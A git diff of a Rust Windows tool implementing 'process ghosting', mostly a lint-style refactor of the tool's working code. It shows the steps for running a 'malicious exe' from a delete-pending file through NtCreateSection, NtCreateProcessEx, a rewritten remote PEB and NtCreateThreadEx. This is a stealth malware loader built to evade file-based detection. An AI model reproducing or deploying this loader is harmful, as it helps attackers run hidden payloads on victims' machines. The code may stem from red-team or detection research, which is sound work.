@@ -7,7 +7,6 @@ use anyhow::{Result, bail};
 use clap::{ArgAction, Parser};
 use clio::ClioPath;
 use log::{info, trace};
-use ntapi::ntmmapi::{NtMapViewOfSection, NtUnmapViewOfSection, ViewShare};
 use ntapi::ntpsapi::{NtCreateProcessEx, NtCreateThreadEx, PROCESS_BASIC_INFORMATION};
 use ntapi::ntrtl::{
     RTL_USER_PROC_PARAMS_NORMALIZED, RTL_USER_PROCESS_PARAMETERS, RtlCreateProcessParametersEx,
@@ -15,25 +14,23 @@ use ntapi::ntrtl::{
 use utils::unicode_string::to_unicode_string;
 use windows::Wdk::Storage::FileSystem::NtCreateSection;
 use windows::Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation};
-use windows::Win32::Foundation::{GENERIC_EXECUTE, HANDLE};
+use windows::Win32::Foundation::HANDLE;
 use windows::Win32::Storage::FileSystem::{
-    CreateFileA, DELETE, FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO, FILE_EXECUTE,
-    FILE_GENERIC_EXECUTE, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_DELETE,
-    FILE_SHARE_READ, FILE_SHARE_WRITE, FileDispositionInfo, FlushFileBuffers, OPEN_ALWAYS,
-    SYNCHRONIZE, SetFileInformationByHandle, WriteFile,
+    CreateFileA, DELETE, FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO, FILE_GENERIC_EXECUTE,
+    FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
+    FileDispositionInfo, FlushFileBuffers, OPEN_ALWAYS, SYNCHRONIZE, SetFileInformationByHandle,
+    WriteFile,
 };
 use windows::Win32::System::Diagnostics::Debug::{
-    IMAGE_NT_HEADERS64, ImageNtHeader, ReadProcessMemory, WriteProcessMemory,
+    ImageNtHeader, ReadProcessMemory, WriteProcessMemory,
 };
 use windows::Win32::System::Environment::CreateEnvironmentBlock;
 use windows::Win32::System::Memory::{
-    MEM_COMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, SEC_IMAGE, SECTION_ALL_ACCESS,
-    VirtualAllocEx,
+    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, SEC_IMAGE, SECTION_ALL_ACCESS, VirtualAllocEx,
 };
-use windows::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 use windows::Win32::System::Threading::{
-    GetCurrentProcess, GetCurrentProcessId, GetExitCodeThread, OpenProcess, PROCESS_ALL_ACCESS,
-    THREAD_ALL_ACCESS, WaitForSingleObject,
+    GetCurrentProcess, GetExitCodeThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
+    WaitForSingleObject,
 };
 use windows::core::PCSTR;
 
@@ -87,8 +84,8 @@ fn main() -> Result<()> {
         trace!("Waiting for ghost thread...");
         WaitForSingleObject(h_ghost.0, 2000); // Wait 2 seconds
         let mut exit_code: u32 = 0;
-        GetExitCodeThread(h_ghost.0, &mut exit_code)?;
-        info!("Ghost thread exit code: {:#x}", exit_code);
+        GetExitCodeThread(h_ghost.0, &raw mut exit_code)?;
+        info!("Ghost thread exit code: {exit_code:#x}");
     }
 
     Ok(())
@@ -108,11 +105,11 @@ fn create_file(target_exe: &ClioPath) -> Result<SafeHandle> {
 
     trace!("Successfully created CString");
 
-    trace!("Creating file {}", target_exe.to_string());
+    trace!("Creating file {target_exe}");
 
     unsafe {
         let handle = CreateFileA(
-            PCSTR(target_exe_cstr.as_ptr() as *const u8),
+            PCSTR(target_exe_cstr.as_ptr().cast::<u8>()),
             (DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE | FILE_GENERIC_EXECUTE)
                 .0,
             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
@@ -139,8 +136,9 @@ fn set_delete_pending(fh: &SafeHandle) -> Result<()> {
         SetFileInformationByHandle(
             fh.0,
             FileDispositionInfo,
-            &fdi as *const _ as *const _,
-            std::mem::size_of::<FILE_DISPOSITION_INFO>() as u32,
+            (&raw const fdi).cast(),
+            u32::try_from(std::mem::size_of::<FILE_DISPOSITION_INFO>())
+                .expect("Expected size of FileDispositionInfo to fit in u32"),
         )?;
     }
     info!("SetFileInformationByHandle call finished");
@@ -149,15 +147,12 @@ fn set_delete_pending(fh: &SafeHandle) -> Result<()> {
 }
 
 fn read_file(file: &ClioPath, buf: &mut Vec<u8>) -> Result<()> {
-    trace!("Opening exe file from {}", file.to_string());
+    trace!("Opening exe file from {file}");
     let mut file = file.clone().open()?;
 
     trace!("Reading malicious exe file in memory");
     let bytes_read = file.read_to_end(buf)?;
-    info!(
-        "Finished reading malicious exe file in memory, {} bytes read",
-        bytes_read
-    );
+    info!("Finished reading malicious exe file in memory, {bytes_read} bytes read");
 
     Ok(())
 }
@@ -167,20 +162,20 @@ fn write_malicious_content(h_target: &SafeHandle, buf: &[u8]) -> Result<SafeHand
 
     trace!("Writing malicious code to target file handle");
     unsafe {
-        WriteFile(h_target.0, Some(buf), Some(&mut bytes_written), None)?;
+        WriteFile(h_target.0, Some(buf), Some(&raw mut bytes_written), None)?;
     }
-    info!("WriteFile call finished, wrote {} bytes", bytes_written);
+    info!("WriteFile call finished, wrote {bytes_written} bytes");
 
     trace!("Flushing file buffers to ensure kernel consistency");
     unsafe {
         FlushFileBuffers(h_target.0)?;
     }
 
-    let mut h_section: HANDLE = Default::default();
+    let mut h_section = HANDLE::default();
 
     unsafe {
         let status = NtCreateSection(
-            &mut h_section,
+            &raw mut h_section,
             SECTION_ALL_ACCESS.0,
             None,
             None,
@@ -201,9 +196,9 @@ fn write_malicious_content(h_target: &SafeHandle, buf: &[u8]) -> Result<SafeHand
 }
 
 fn create_process(h_section: &SafeHandle) -> Result<SafeHandle> {
-    let mut h_process: HANDLE = Default::default();
+    let mut h_process = HANDLE::default();
 
-    // Debug
+    /* // Debug
     unsafe {
         let mut base_address: *mut ntapi::winapi::ctypes::c_void = ptr::null_mut();
         let mut view_size: usize = 0;
@@ -227,28 +222,23 @@ fn create_process(h_section: &SafeHandle) -> Result<SafeHandle> {
         if status == 0 {
             let _ = NtUnmapViewOfSection(GetCurrentProcess().0 as *mut _, base_address);
         }
-    }
+    } */
 
     unsafe {
-        // let h_parent: SafeHandle = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId())?.into();
-
         let status = NtCreateProcessEx(
-            &mut h_process.0 as *mut _ as *mut _,
+            (&raw mut h_process.0).cast(),
             PROCESS_ALL_ACCESS.0,
             ptr::null_mut(),
-            GetCurrentProcess().0 as *mut _,
+            GetCurrentProcess().0.cast(),
             0,
-            h_section.0.0 as *mut _,
+            h_section.0.0.cast(),
             ptr::null_mut(),
             ptr::null_mut(),
             0,
         );
 
         if status != 0 {
-            bail!(
-                "Error while calling NtCreateProcessEx, received status {:#x}",
-                status
-            )
+            bail!("Error while calling NtCreateProcessEx, received status {status:#x}")
         }
     }
 
@@ -265,9 +255,10 @@ fn get_process_basic_information(h_process: &SafeHandle) -> Result<PROCESS_BASIC
         let status = NtQueryInformationProcess(
             h_process.0,
             ProcessBasicInformation,
-            proc_info.as_mut_ptr() as *mut _,
-            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-            &mut return_length,
+            proc_info.as_mut_ptr().cast(),
+            u32::try_from(std::mem::size_of::<PROCESS_BASIC_INFORMATION>())
+                .expect("Expected ProcessBasicInformation length to fit in u32"),
+            &raw mut return_length,
         );
 
         if status.0 != 0 {
@@ -292,9 +283,9 @@ fn get_entry_point(h_process: &SafeHandle, pbi: PROCESS_BASIC_INFORMATION) -> Re
         ReadProcessMemory(
             h_process.0,
             (pbi.PebBaseAddress as usize + 0x10) as *const _,
-            &mut image_base as *mut _ as *mut _,
+            (&raw mut image_base).cast(),
             std::mem::size_of::<usize>(),
-            Some(&mut bytes_read),
+            Some(&raw mut bytes_read),
         )?;
 
         // 2. Map the header locally to parse it
@@ -303,13 +294,13 @@ fn get_entry_point(h_process: &SafeHandle, pbi: PROCESS_BASIC_INFORMATION) -> Re
         ReadProcessMemory(
             h_process.0,
             image_base as *const _,
-            header_buffer.as_mut_ptr() as *mut _,
+            header_buffer.as_mut_ptr().cast(),
             header_buffer.len(),
             None,
         )?;
 
         // 3. Use ImageNtHeader to find the NT headers in our local copy
-        let nt_header_ptr = ImageNtHeader(header_buffer.as_ptr() as *const _);
+        let nt_header_ptr = ImageNtHeader(header_buffer.as_ptr().cast());
         if nt_header_ptr.is_null() {
             bail!("ImageNtHeader failed to find valid PE headers");
         }
@@ -328,21 +319,21 @@ fn setup_process_parameters(target_exe: &ClioPath) -> Result<*mut RTL_USER_PROCE
     let mut environment = ptr::null_mut();
 
     unsafe {
-        CreateEnvironmentBlock(&mut environment, Some(HANDLE::default()), true)?;
+        CreateEnvironmentBlock(&raw mut environment, Some(HANDLE::default()), true)?;
     }
 
-    let environment: *mut ntapi::winapi::ctypes::c_void = environment as *mut _;
+    let environment: *mut ntapi::winapi::ctypes::c_void = environment.cast();
     let mut img_path = to_unicode_string(&target_exe.to_string());
     let mut cmd_line = to_unicode_string(&target_exe.to_string()); // Often same as path
     let mut params: *mut RTL_USER_PROCESS_PARAMETERS = ptr::null_mut();
 
     unsafe {
         let status = RtlCreateProcessParametersEx(
-            &mut params,
-            &mut img_path,
+            &raw mut params,
+            &raw mut img_path,
             ptr::null_mut(),
             ptr::null_mut(),
-            &mut cmd_line,
+            &raw mut cmd_line,
             environment,
             ptr::null_mut(),
             ptr::null_mut(),
@@ -352,10 +343,7 @@ fn setup_process_parameters(target_exe: &ClioPath) -> Result<*mut RTL_USER_PROCE
         );
 
         if status != 0 {
-            bail!(
-                "Error while calling NtCreateProcessEx, received status {:#x}",
-                status
-            );
+            bail!("Error while calling NtCreateProcessEx, received status {status:#x}");
         }
     }
 
@@ -429,7 +417,7 @@ fn link_params_to_ghost_process(
         WriteProcessMemory(
             h_process.0,
             (peb_base + 0x20) as *const _,
-            &remote_params_ptr as *const _ as *const _,
+            (&raw const remote_params_ptr).cast(),
             8,
             None,
         )?;
@@ -443,10 +431,10 @@ fn start_ghost_thread(h_process: &SafeHandle, entry_point: usize) -> Result<Safe
 
     unsafe {
         let status = NtCreateThreadEx(
-            &mut h_thread.0 as *mut _ as *mut _,
+            (&raw mut h_thread.0).cast(),
             THREAD_ALL_ACCESS.0,
             ptr::null_mut(),
-            h_process.0.0 as *mut _,
+            h_process.0.0.cast(),
             entry_point as *mut _,
             ptr::null_mut(),
             0,
@@ -457,23 +445,10 @@ fn start_ghost_thread(h_process: &SafeHandle, entry_point: usize) -> Result<Safe
         );
 
         if status != 0 {
-            anyhow::bail!("NtCreateThreadEx failed: {:#x}", status);
+            anyhow::bail!("NtCreateThreadEx failed: {status:#x}");
         }
     }
 
     info!("Ghost thread created! Process is now running.");
     Ok(h_thread.into())
-}
-
-fn get_environment_size(env_ptr: *mut std::ffi::c_void) -> usize {
-    let mut ptr = env_ptr as *const u16;
-
-    unsafe {
-        while *ptr != 0 || *ptr.add(1) != 0 {
-            ptr = ptr.add(1);
-        }
-    }
-
-    // Add 2 for the double null terminator
-    (ptr as usize - env_ptr as usize) + 4
 }
